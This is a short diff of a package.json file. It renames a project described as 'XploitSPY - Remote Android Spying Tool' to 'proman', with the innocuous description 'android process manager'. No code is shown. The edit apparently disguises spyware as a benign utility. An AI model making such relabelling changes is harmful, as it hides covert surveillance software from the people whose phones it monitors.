@@ -1,7 +1,7 @@
 {
-    "name": "xploitspy",
+    "name": "proman",
     "version": "1.0.0",
-    "description": "XploitSPY - Remote Android Spying Tool",
+    "description": "android process manager",
     "main": "index.js",
     "scripts": {
         "start": "node server/index.js",
